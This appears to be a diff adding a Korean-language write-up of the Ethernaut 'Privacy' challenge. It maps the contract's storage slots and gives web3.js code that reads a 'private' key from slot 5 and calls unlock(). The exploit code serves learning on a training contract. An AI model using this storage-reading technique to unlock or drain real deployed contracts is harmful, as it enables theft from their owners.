@@ -203,3 +203,23 @@ contract Claimer is Building{
 }
 ```
 
+### Privacy
+slot 구성에 대해서 배울 수 있는 문제
+https://docs.soliditylang.org/en/v0.8.26/internals/layout_in_storage.html
+
+```
+//slot 구성
+bool public locked = true; // 0th (32byte)
+uint256 public ID = block.timestamp; // 1st (32byte)
+uint8 private flattening = 10; // 2nd (1byte)
+uint8 private denomination = 255; // 2nd (1byte)
+uint16 private awkwardness = uint16(block.timestamp); // 2nd (2byte)
+bytes32[3] private data; // data[0] = 3rd // data[1] = 4th // data[2] = 5th
+```
+
+```
+const functionSignature = web3.eth.abi.encodeFunctionSignature("unlock(bytes16)")
+const key = await web3.eth.getStorageAt(contract.address,5) 
+const parameter = web3.eth.abi.encodeParameter('bytes16',key) // bytes는 32byte padding을 할 때, padEnd를 사용함.
+await sendTransaction({from:player, to:contract.address, data:functionSignature+parameter.slice(2)})
+```
